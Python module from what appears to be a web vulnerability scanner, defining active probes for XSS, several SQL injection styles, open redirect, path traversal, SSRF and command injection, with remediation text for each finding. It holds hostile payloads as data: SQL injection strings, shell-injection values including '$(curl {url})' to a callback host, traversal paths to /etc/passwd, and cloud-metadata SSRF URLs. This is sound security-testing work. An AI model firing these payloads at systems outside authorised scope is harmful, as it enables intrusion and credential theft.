"""Active checks: mutate one input, send the probe, judge the response.

Every check here sends attack traffic to the target, so the engine only ever
runs them against hosts the operator has put in scope. Each check is written
for high confidence and a small probe budget: a handful of payloads per input,
and a finding only on an unambiguous signal (a raw reflection, a database error
that was not there before, a redirect to our marker host, a file-content
signature, or a reproducible time delay).

A check is `run(point, ctx) -> Iterable[Finding]`. Register it in ACTIVE_CHECKS.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass
from typing import Any, Callable, Iterable

from ..flow import Request, Response
from .findings import Finding
from .points import InsertionPoint

# The engine hands each check this. `exchange` is replay.exchange bound to the proxy.
ExchangeFn = Callable[[Request], "tuple[Response | None, str, float]"]


@dataclass
class ProbeContext:
    base_flow_id: int
    base_url: str
    base_request: Request
    baseline: Response | None
    exchange: ExchangeFn
    time_delay_s: float = 3.0
    collaborator: Any = None        # a Collaborator when out-of-band checks are enabled, else None
    oob_registry: dict | None = None  # token -> Finding, correlated after the scan when a hit arrives
    _sent: int = 0

    def send(self, request: Request) -> tuple[Response | None, float]:
        self._sent += 1
        response, _error, seconds = self.exchange(request)
        return response, seconds

    def register_oob(self, token: str, finding: "Finding") -> None:
        if self.oob_registry is not None:
            self.oob_registry[token] = finding


def _finding(check, point, ctx, severity, title, evidence, detail, confidence="firm") -> Finding:
    return Finding(
        check=check, title=f"{title} in {point.label}", severity=severity, flow_id=ctx.base_flow_id,
        url=ctx.base_url, evidence=evidence, detail=detail, confidence=confidence,
        where=f"{check}|{ctx.base_url}|{point.label}",
    )


def _is_html(response: Response | None) -> bool:
    ctype = (response.headers.get("content-type") or "").lower() if response else ""
    return "html" in ctype


# ── reflected XSS ─────────────────────────────────────────────────

def check_reflected_xss(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    marker = "rff" + secrets.token_hex(4)
    payload = f'{marker}<img src=x onerror=1>'
    response, _ = ctx.send(point.inject(ctx.base_request, payload))
    if response is None or response.body_streamed:
        return
    body = response.text()
    if payload in body and _is_html(response):
        # The angle brackets came back raw, in an HTML response: the browser parses them as markup.
        yield _finding("xss-reflected", point, ctx, "high", "Reflected cross-site scripting",
                       f"payload {payload!r} reflected unescaped in the HTML response",
                       "Input is echoed into HTML without encoding. Encode on output or validate the input.")


# ── SQL injection: error-based ────────────────────────────────────

_SQL_ERRORS = re.compile(
    r"SQL syntax|mysql_fetch|valid MySQL result|ORA-\d{5}|PostgreSQL.*ERROR|PG::SyntaxError|"
    r"SQLite/JDBCDriver|SQLite3::|Unclosed quotation mark|quoted string not properly terminated|"
    r"SQLSTATE\[|Microsoft OLE DB|ODBC SQL Server|Incorrect syntax near|System\.Data\.SqlClient",
    re.IGNORECASE,
)


def check_sqli_error(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    baseline_body = ctx.baseline.text() if ctx.baseline and not ctx.baseline.body_streamed else ""
    if _SQL_ERRORS.search(baseline_body):
        return  # the error was already there; injecting a quote proves nothing
    response, _ = ctx.send(point.inject(ctx.base_request, "'"))
    if response is None or response.body_streamed:
        return
    match = _SQL_ERRORS.search(response.text())
    if match:
        yield _finding("sqli-error", point, ctx, "high", "SQL injection (database error)",
                       f"a single quote produced a database error: {match.group(0)!r}",
                       "A quote reaches the SQL parser. Use parameterised queries.")


# ── SQL injection: time-based ─────────────────────────────────────

_TIME_PAYLOADS = (
    "1' OR SLEEP({d})-- -",
    "1\" OR SLEEP({d})-- -",
    "1'; WAITFOR DELAY '0:0:{d}'-- -",
    "1) OR SLEEP({d})-- -",
)


def check_sqli_time(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    delay = ctx.time_delay_s
    # Establish a fast baseline for this exact input first.
    quick, quick_secs = ctx.send(point.inject(ctx.base_request, "1"))
    if quick is None or quick_secs >= delay * 0.6:
        return  # too slow to time reliably
    for template in _TIME_PAYLOADS:
        payload = template.format(d=int(round(delay)))
        response, seconds = ctx.send(point.inject(ctx.base_request, payload))
        if response is None or seconds < delay * 0.9:
            continue
        # Confirm: a second slow response makes a coincidental delay unlikely.
        _confirm, confirm_secs = ctx.send(point.inject(ctx.base_request, payload))
        if confirm_secs >= delay * 0.9:
            yield _finding("sqli-time", point, ctx, "high", "SQL injection (time-based blind)",
                           f"payload {payload!r} delayed the response ~{seconds:.1f}s (baseline {quick_secs:.2f}s)",
                           "The input controls query timing, so it reaches the SQL engine. Parameterise it.",
                           confidence="tentative")
            return


# ── open redirect ─────────────────────────────────────────────────

_MARKER_HOST = "riff-scan-oob.example"


def check_open_redirect(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    for payload in (f"https://{_MARKER_HOST}/", f"//{_MARKER_HOST}/"):
        response, _ = ctx.send(point.inject(ctx.base_request, payload))
        if response is None or not (300 <= response.status < 400):
            continue
        location = (response.headers.get("location") or "").strip()
        if location.startswith(payload) or location.startswith(f"https://{_MARKER_HOST}") or location.startswith(f"//{_MARKER_HOST}"):
            yield _finding("open-redirect", point, ctx, "medium", "Open redirect",
                           f"Location header points to the marker host: {location!r}",
                           "The input controls the redirect target. Allow only vetted destinations.")
            return


# ── path traversal ────────────────────────────────────────────────

_TRAVERSAL = (
    ("../../../../../../../../etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", re.compile(r"\[fonts\]|\[extensions\]|16-bit app support", re.IGNORECASE)),
)


def check_path_traversal(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    for payload, signature in _TRAVERSAL:
        for mode in ("replace", "append"):
            response, _ = ctx.send(point.inject(ctx.base_request, payload, mode=mode))
            if response is None or response.body_streamed:
                continue
            if signature.search(response.text()):
                yield _finding("path-traversal", point, ctx, "high", "Path traversal",
                               f"payload {payload!r} returned a system file's contents",
                               "The input reaches the filesystem. Canonicalise and confine to a safe root.")
                return


# ── SQL injection: boolean-based blind ────────────────────────────

def _similar(a: str, b: str) -> float:
    """0..1 similarity of two response bodies, length-normalised and cheap."""
    from difflib import SequenceMatcher

    if not a and not b:
        return 1.0
    # Compare a bounded prefix so a huge body cannot make this slow.
    return SequenceMatcher(None, a[:4000], b[:4000]).ratio()


def check_sqli_boolean(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    """A TRUE condition matches the page; a FALSE one changes it. Classic blind SQLi."""
    orig = point.original or "1"
    pairs = (
        (f"{orig}' AND '1'='1", f"{orig}' AND '1'='2"),
        (f"{orig}\" AND \"1\"=\"1", f"{orig}\" AND \"1\"=\"2"),
        (f"{orig} AND 1=1", f"{orig} AND 1=2"),
    )
    for true_payload, false_payload in pairs:
        true_resp, _ = ctx.send(point.inject(ctx.base_request, true_payload))
        false_resp, _ = ctx.send(point.inject(ctx.base_request, false_payload))
        if true_resp is None or false_resp is None or true_resp.body_streamed or false_resp.body_streamed:
            continue
        if true_resp.status != false_resp.status:
            # A condition that flips the status code is a strong signal on its own.
            yield _finding("sqli-boolean", point, ctx, "high", "SQL injection (boolean blind)",
                           f"TRUE gave {true_resp.status}, FALSE gave {false_resp.status}",
                           "The input alters query logic. Use parameterised queries.")
            return
        true_body, false_body = true_resp.text(), false_resp.text()
        # TRUE should look like the real page; FALSE should differ clearly.
        if _similar(true_body, false_body) < 0.95 and _similar(true_body, ctx.baseline.text() if ctx.baseline and not ctx.baseline.body_streamed else true_body) > 0.9:
            yield _finding("sqli-boolean", point, ctx, "high", "SQL injection (boolean blind)",
                           "a TRUE condition matched the page while a FALSE one changed it",
                           "The input alters query logic. Use parameterised queries.")
            return


# ── OS command injection: time-based ──────────────────────────────

_CMD_PAYLOADS = (
    "; sleep {d}",
    "| sleep {d}",
    "& ping -n {n} 127.0.0.1",
    "$(sleep {d})",
    "`sleep {d}`",
)


def check_cmd_injection(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    delay = ctx.time_delay_s
    quick, quick_secs = ctx.send(point.inject(ctx.base_request, point.original or "x"))
    if quick is None or quick_secs >= delay * 0.6:
        return
    for template in _CMD_PAYLOADS:
        payload = (point.original or "") + template.format(d=int(round(delay)), n=int(round(delay)) + 1)
        response, seconds = ctx.send(point.inject(ctx.base_request, payload))
        if response is None or seconds < delay * 0.9:
            continue
        _confirm, confirm_secs = ctx.send(point.inject(ctx.base_request, payload))
        if confirm_secs >= delay * 0.9:
            yield _finding("cmd-injection", point, ctx, "high", "OS command injection (time-based)",
                           f"payload {payload!r} delayed the response ~{seconds:.1f}s (baseline {quick_secs:.2f}s)",
                           "The input reaches a shell. Never pass user input to a command; use safe APIs.",
                           confidence="tentative")
            return


# ── server-side request forgery (in-band) ─────────────────────────

_SSRF_TARGETS = (
    ("http://169.254.169.254/latest/meta-data/", re.compile(r"ami-id|instance-id|iam/security-credentials|placement/")),
    ("http://metadata.google.internal/computeMetadata/v1/", re.compile(r"computeMetadata|project-id|service-accounts")),
)
# Only worth probing where the value plausibly names a location.
_URLISH = re.compile(r"^(https?:)?//|^/|\.(com|net|org|io|internal|local)\b|localhost|\d{1,3}(\.\d{1,3}){3}", re.IGNORECASE)
_URLISH_NAMES = ("url", "uri", "u", "link", "next", "dest", "destination", "redirect", "return", "callback",
                 "target", "host", "domain", "site", "feed", "image", "img", "src", "path", "file", "load", "fetch")


def check_ssrf(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    name = point.name.lower()
    looks_like_location = bool(_URLISH.search(point.original or "")) or any(n == name or n in name for n in _URLISH_NAMES)
    if not looks_like_location:
        return  # keep SSRF probes off inputs that clearly are not locations
    for payload, signature in _SSRF_TARGETS:
        response, _ = ctx.send(point.inject(ctx.base_request, payload))
        if response is None or response.body_streamed:
            continue
        if signature.search(response.text()):
            yield _finding("ssrf", point, ctx, "high", "Server-side request forgery",
                           f"the server fetched {payload!r} and returned cloud-metadata content",
                           "The input controls a server-side fetch. Allowlist destinations; block link-local ranges.")
            return


# ── out-of-band interaction (blind SSRF / injection) ──────────────

def check_oob_interaction(point: InsertionPoint, ctx: ProbeContext) -> Iterable[Finding]:
    """Inject a collaborator URL so blind server-side fetches call home.

    This emits nothing directly. It registers a token against a finding template;
    the engine polls the collaborator after the scan and raises the finding only
    if that token was actually reached. Inert unless a collaborator is configured.
    """
    if ctx.collaborator is None or ctx.oob_registry is None:
        return
    token, url = ctx.collaborator.issue()
    # Plain URL value (SSRF), and shell/argument-style payloads (blind command injection).
    payloads = (
        url,
        f"{point.original or ''};curl {url}",
        f"{point.original or ''}|curl {url}",
        f"$(curl {url})",
    )
    for payload in payloads:
        ctx.send(point.inject(ctx.base_request, payload))
    finding = _finding(
        "oob-interaction", point, ctx, "high", "Out-of-band interaction (blind SSRF or injection)",
        f"a payload in {point.label} caused the server to call the collaborator",
        "The input reaches code that makes outbound requests. Allowlist destinations and never pass input to a shell.",
    )
    ctx.register_oob(token, finding)


CheckFn = Callable[[InsertionPoint, ProbeContext], Iterable[Finding]]


@dataclass(frozen=True)
class ActiveCheck:
    name: str
    fn: CheckFn
    default_on: bool  # off-by-default checks are slow or noisier (e.g. time-based)

    def run(self, point: InsertionPoint, ctx: ProbeContext) -> list[Finding]:
        try:
            return list(self.fn(point, ctx))
        except Exception:  # a check bug must not sink the whole scan
            return []


# Fast, deterministic checks are on by default. Time-based is opt-in: it is slow
# and its signal (wall-clock delay) is noisier.
ACTIVE_CHECKS: tuple[ActiveCheck, ...] = (
    ActiveCheck("xss-reflected", check_reflected_xss, True),
    ActiveCheck("sqli-error", check_sqli_error, True),
    ActiveCheck("sqli-boolean", check_sqli_boolean, True),
    ActiveCheck("open-redirect", check_open_redirect, True),
    ActiveCheck("path-traversal", check_path_traversal, True),
    ActiveCheck("ssrf", check_ssrf, True),
    ActiveCheck("sqli-time", check_sqli_time, False),
    ActiveCheck("cmd-injection", check_cmd_injection, False),
    # Out-of-band: inert unless a collaborator is configured; enabled automatically then.
    ActiveCheck("oob-interaction", check_oob_interaction, False),
)

CHECKS_BY_NAME = {c.name: c for c in ACTIVE_CHECKS}
DEFAULT_CHECK_NAMES = tuple(c.name for c in ACTIVE_CHECKS if c.default_on)


def select_checks(names: "Iterable[str] | None") -> list[ActiveCheck]:
    """Resolve check names to checks. None means the default-on set."""
    if names is None:
        return [c for c in ACTIVE_CHECKS if c.default_on]
    wanted = set(names)
    return [c for c in ACTIVE_CHECKS if c.name in wanted]
